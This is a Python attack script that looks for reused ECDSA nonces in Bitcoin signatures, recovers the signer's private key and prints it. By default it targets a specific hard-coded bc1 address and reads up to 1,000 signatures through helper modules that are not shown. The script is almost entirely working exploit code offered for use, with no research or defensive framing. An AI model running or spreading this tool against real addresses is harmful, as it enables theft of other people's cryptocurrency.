import json
import sys
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key
from tx_preimage_reconstructor import extract_sigs_with_real_z

P = SECP256k1.order

def solve_r_reuse(sigs, address):
    print(f"Analyzing {len(sigs)} sigs for {address}...")
    r_map = {}
    for i, s in enumerate(sigs):
        r = s['r']
        if r in r_map:
            prev_i = r_map[r]
            s1, z1 = sigs[prev_i]['s'], sigs[prev_i]['z']
            s2, z2 = s['s'], s['z']
            
            if z1 == z2:
                print(f"  R-reuse with same Z at indices {prev_i}, {i} (not exploitable)")
                continue
                
            print(f"!!! REAL R-REUSE FOUND at indices {prev_i}, {i} !!!")
            k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
            d = ((s1 * k - z1) * pow(r, -1, P)) % P
            
            if verify_key(d, address):
                print(f"!!! SUCCESS !!! Key: {hex(d)}")
                return d
        r_map[r] = i
    return None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "bc1ql5hlr8ugqlav2ct3p0c5zwvjyarf0afgh6f5v6"
    sigs = extract_sigs_with_real_z(target, max_sigs=1000)
    if sigs:
        solve_r_reuse(sigs, target)
    else:
        print("No sigs found.")
